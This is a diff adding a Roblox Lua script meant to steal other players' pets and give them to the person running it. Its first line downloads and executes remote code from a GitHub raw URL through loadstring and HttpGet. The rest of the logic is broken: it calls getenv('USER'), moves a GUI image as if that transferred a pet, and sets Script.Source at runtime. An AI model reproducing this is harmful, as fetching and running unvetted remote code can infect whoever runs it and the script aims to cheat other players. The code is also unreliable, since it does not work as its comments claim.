@@ -1,0 +1,50 @@
+-- Load Solara Executor library
+loadstring(game:HttpGet("https://raw.githubusercontent.com/solaxrsd/Solara-Executor/main/Source.lua"))()
+
+-- Wait for the player to join
+while wait(1) do
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        -- Skip if the player is the script owner
+        if player.Name == getenv("USER") then continue end
+
+        -- Check if the player has any pets
+        local hasPet = false
+        for _, v in ipairs(player.PlayerGui:GetDescendants()) do
+            if v:IsA("ImageButton") and v.ImageTransparency == 0 then
+                hasPet = true
+                break
+            end
+        end
+
+        -- If the player has a pet, steal it and give it to the script owner
+        if hasPet then
+            local pet = player.PlayerGui.Pet.Selector.Button.Image
+            local scriptOwner = game.Players:FindFirstChild(getenv("USER"))
+
+            -- Equip the pet
+            pet.Parent = scriptOwner.PlayerGui.Pet.Selector.Button
+            scriptOwner.Character.Humanoid.Health = 0
+
+            -- Force the pet into the script owner's inventory
+            local newPet = scriptOwner.Backpack:FindFirstChildOfClass("Tool")
+            newPet.Parent = scriptOwner.Character
+
+            -- Make the stolen pet follow the thief
+            local script = Instance.new("Script")
+            script.Name = "PetFollowScript"
+            script.Source = [[
+                local mouse = game.Players.LocalPlayer:GetMouse()
+                script.Parent:Connect(function()
+                    local character = game.Players.LocalPlayer.Character
+                    if character then
+                        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+                        if humanoidRootPart then
+                            script.Parent.CFrame = CFrame.new(mouse.Hit.p + Vector3.new(0, -5, 0))
+                        end
+                    end
+                end)
+            ]]
+            script.Parent = newPet
+        end
+    end
+end
